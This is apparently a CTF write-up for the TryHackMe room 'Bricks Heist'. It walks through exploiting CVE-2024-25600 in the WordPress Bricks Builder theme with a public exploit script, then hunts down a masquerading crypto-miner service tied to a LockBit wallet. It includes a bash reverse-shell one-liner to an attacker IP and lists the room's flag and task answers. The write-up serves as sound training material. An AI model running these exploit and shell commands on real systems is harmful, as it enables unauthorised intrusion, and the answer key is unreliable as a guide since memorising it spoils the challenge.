---
layout: default
title: TryHack3M: Bricks Heist
---


**Format:** Boot-to-Root CTF + Threat Hunting 

**Difficulty:** Medium 

**CVE:** CVE-2024-25600 (WordPress Bricks Builder RCE) 


---

## Overview

Brick Press Media Co. had a bad day. Their WordPress site got owned, and Agent Murphy needs you to hack it back and figure out what the attacker left behind. Spoiler: it was not a thank-you note.

This room is a neat two-act story. Act one is exploitation: find the vulnerable WordPress theme, grab the CVE, get a shell. Act two is forensics: something is still running on that box and it is very much not supposed to be there.

From a SOC or blue team perspective, this is the kind of incident that shows up in alerts as "unusual outbound connection" or "unexpected process CPU spike." Knowing how to trace a suspicious service back to a malicious binary and then pivot to threat intelligence is the actual skill here.

```
+-------------------------------------+
|         Attack Chain Summary        |
|                                     |
|  /etc/hosts -> nmap -> WPScan       |
|        |                            |
|        v                            |
|  CVE-2024-25600 (Bricks RCE)        |
|        |                            |
|        v                            |
|  Unauthenticated Shell              |
|        |                            |
|        v                            |
|  Flag 1 (hidden .txt in web dir)    |
|        |                            |
|        v                            |
|  systemctl -> ubuntu.service        |
|        |                            |
|        v                            |
|  nm-inet-dialog (crypto miner)      |
|        |                            |
|        v                            |
|  inet.conf -> CyberChef -> wallet   |
|        |                            |
|        v                            |
|  Blockchain lookup -> LockBit       |
+-------------------------------------+
```

---

## Phase 1: Reconnaissance

### /etc/hosts Setup

The room tells you to add the machine IP to `/etc/hosts`. That is a hint to also look at subdomains, but first things first.

```bash
echo "MACHINE_IP bricks.thm" | sudo tee -a /etc/hosts
```

### Nmap Scan

```bash
nmap -T4 -sC -sV -p- bricks.thm
```

Four ports come back open:

```
PORT     STATE  SERVICE
22/tcp   open   ssh (OpenSSH 8.2p1)
80/tcp   open   http
443/tcp  open   https (Apache)
3306/tcp open   mysql
```

Port 80 throws a `GET method not allowed` error. Classic. Move to 443. The site shows a picture of a brick wall with "brick by brick" as the caption. Subtle.

### Web Enumeration

Gobuster the directories:

```bash
gobuster dir -u https://bricks.thm -w /usr/share/wordlists/dirb/big.txt \
  --exclude-length 472 -k
```

Directories found:
```
/wp-admin
/wp-content
/wp-includes
```

It is WordPress. View the page source and you will find:

```html
<meta name="generator" content="WordPress 6.5" />
<link rel='stylesheet' id='bricks-frontend-css'
  href='https://bricks.thm/wp-content/themes/bricks/assets/css/frontend.min.css?ver=1704844350'
```

Bricks theme. Version timestamp. Time to run WPScan.

### WPScan

```bash
wpscan --url https://bricks.thm --disable-tls-checks
```

The `--disable-tls-checks` flag is needed because the SSL cert is self-signed and WPScan will just give up otherwise. The scan returns the **Bricks theme version 1.9.5**.

One quick Google search for "Bricks Builder 1.9.5 vulnerability" and the answer falls out immediately.

---

## Phase 2: Exploitation (CVE-2024-25600)

### What Is CVE-2024-25600?

This is an **unauthenticated Remote Code Execution** vulnerability in the Bricks Builder theme for WordPress. The vulnerability lives in the theme's REST API endpoint. Bricks Builder uses a nonce to protect REST routes, but the nonce is predictable and retrievable without authentication. Once you have the nonce, you can send a specially crafted POST request that executes arbitrary PHP code on the server.

No login required. No credentials needed. A very bad day for whoever left that site unpatched.

```
+------------------------------------------+
|        CVE-2024-25600 Flow               |
|                                          |
|  Attacker -> GET / -> Retrieve nonce     |
|  Attacker -> POST /wp-json/bricks/v1/   |
|              render_element              |
|           -> Inject PHP payload          |
|           -> Code executes as www-data   |
+------------------------------------------+
```

**Affected versions:** Bricks Builder <= 1.9.6
**Patched in:** 1.9.7

### Getting the Exploit

```bash
git clone https://github.com/Tornad0007/CVE-2024-25600-Bricks-Builder-plugin-for-WordPress.git
cd CVE-2024-25600-Bricks-Builder-plugin-for-WordPress
pip3 install -r requirements.txt
python3 exploit.py --url https://bricks.thm
```

If you hit module errors, create a virtual environment first:

```bash
python3 -m venv bricksenv
source bricksenv/bin/activate
pip3 install -r requirements.txt
python3 exploit.py --url https://bricks.thm
```

You now have a shell as `www-data`. It is not stable but it works.

### Flag 1: Hidden .txt File

The room asks for a hidden `.txt` file in the web directory. Search for it:

```bash
Shell> find /var/www/html -name "*.txt" 2>/dev/null
```

Or, if you know what you are looking for:

```bash
Shell> find / -name "650c844110baced87e1606453b93f22a.txt" 2>/dev/null
Shell> cat /path/to/650c844110baced87e1606453b93f22a.txt
```

```
THM{fl46_650c844110baced87e1606453b93f22a}
```

A file with its own hash in the filename. Whoever left this did not lack confidence.

### Upgrading the Shell

The exploit shell is unstable. Get a proper reverse shell:

```bash
# On your machine
nc -lvnp 4444

# In the exploit shell
Shell> bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
```

Then stabilise:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

---

## Phase 3: Post-Exploitation and Threat Hunting

Something is running on this box that should not be. Time to find it.

### Finding the Suspicious Service

```bash
systemctl list-units --type=service --state=running
```

One service stands out immediately. Cross-reference with:

```bash
systemctl cat ubuntu.service
```

Output:

```ini
# /etc/systemd/system/ubuntu.service
[Unit]
Description=TRYHACK3M

[Service]
Type=simple
ExecStart=/lib/NetworkManager/nm-inet-dialog
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

`ubuntu.service` with description `TRYHACK3M` running a binary called `nm-inet-dialog` out of the NetworkManager directory. That binary name is designed to look like a legitimate network management process. It is not.

```
+-----------------------------------------------+
|         Evasion Technique: Masquerading        |
|                                                |
|  Legitimate:  /usr/sbin/NetworkManager         |
|  Malicious:   /lib/NetworkManager/nm-inet-dialog |
|                                                |
|  Same directory. Similar name. Very sneaky.    |
|  MITRE ATT&CK: T1036.004 - Masquerade Task    |
|  or Service                                    |
+-----------------------------------------------+
```

### Identifying the Miner

```bash
ls /lib/NetworkManager/
# nm-inet-dialog   inet.conf
```

`inet.conf` is the log file for the miner. Read it:

```bash
head /lib/NetworkManager/inet.conf
```

The top of the file has an ID field containing a long hex-encoded string. Below that, it logs like this:

```
ID: 5757314e65474e5962484a4f656d787457...
2024-04-08 10:46:04,743 [*] confbak: Ready!
2024-04-08 10:46:04,743 [*] Status: Mining!
2024-04-08 10:46:08,745 [*] Bitcoin Miner Thread Started
2024-04-08 10:46:08,745 [*] Status: Mining!
```

"Status: Mining!" is not something you ever want to see on a server you are responsible for.

**Log file name of the miner instance:** `inet.conf`

### Decoding the Wallet Address

The ID in `inet.conf` is multi-layer encoded. Take it to CyberChef and hit the magic wand:

```
Hex -> Base64 -> Base64 -> Bitcoin wallet address
```

Decoded wallet: **bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa**

### Threat Intelligence: Who Does This Wallet Belong To?

Search the wallet on any blockchain explorer (Blockchair, Blockchain.com, or just Google it). The wallet has been involved in transactions with addresses linked to a well-known ransomware-as-a-service operation.

**Threat group: LockBit**

LockBit is one of the most prolific ransomware groups in recent years, responsible for attacks across healthcare, manufacturing and critical infrastructure. Finding their Bitcoin infrastructure on a compromised WordPress server is a reminder that even small sites can end up in very large supply chains of criminal activity.

---

## Task Answer Summary

| Task | Question | Answer |
|------|----------|--------|
| 1.1 | What is the content of the hidden .txt file? | THM{fl46_650c844110baced87e1606453b93f22a} |
| 1.2 | What is the CVE number for the vulnerability? | CVE-2024-25600 |
| 1.3 | What is the name of the suspicious process? | nm-inet-dialog |
| 1.4 | What is the service name the suspicious process is attached to? | ubuntu.service |
| 1.5 | What is the log file name of the miner instance? | inet.conf |
| 1.6 | What is the wallet address of the miner instance? | bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa |
| 1.7 | The wallet address has been involved in transactions belonging to which threat group? | LockBit |

---

## What I Learned / Reinforced

**Unpatched themes are a real entry point.** CVE-2024-25600 was published in February 2024. The THM room dropped in April 2024. That is a very short window between "vulnerability exists" to "actively being used in CTF scenarios modelling real attacks." In production environments, patch management for WordPress themes and plugins is often ignored because they feel lower priority than OS patches. They are not.

**Masquerading is not sophisticated but it works.** The attacker named their miner `nm-inet-dialog` and placed it inside `/lib/NetworkManager/`. If you just ran `ps aux` without thinking critically, it would look plausible. This is MITRE ATT&CK T1036 in practice. The lesson: when investigating a suspicious process, always check the full binary path, not just the process name.

**CyberChef magic wand is not magic, but it is close.** Multi-layer encoding (hex to base64 to base64) is a common obfuscation technique for hiding indicators like wallet addresses or C2 infrastructure in config files. CyberChef's magic function tries common encodings automatically. Useful to know. Do not rely on it exclusively; understanding what it is doing at each layer matters for formal reporting.

**Threat intelligence pivot makes the investigation complete.** Finding the miner is one thing. Linking the wallet to LockBit is what turns an alert from "unusual process" into "we may be part of a ransomware group's infrastructure." That pivot, from artefact to attribution, is the skill that separates incident responders who close tickets from ones who write threat reports.

---

## Resources

- [TryHack3M: Bricks Heist - TryHackMe](https://tryhackme.com/room/tryhack3mbricksheist)
- [CVE-2024-25600 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-25600)
- [Tornad0007 CVE-2024-25600 Exploit - GitHub](https://github.com/Tornad0007/CVE-2024-25600-Bricks-Builder-plugin-for-WordPress)
- [MITRE ATT&CK T1036 - Masquerading](https://attack.mitre.org/techniques/T1036/)
- [MITRE ATT&CK T1496 - Resource Hijacking](https://attack.mitre.org/techniques/T1496/)
- [CyberChef - GCHQ](https://gchq.github.io/CyberChef/)
- [Blockchair Bitcoin Explorer](https://blockchair.com/)

---

*Written by fiza.sk293 · [GitHub](https://github.com/FizaShaikh293)*

*thm-writeups is maintained by FizaShaikh293. This page was generated by GitHub Pages.*
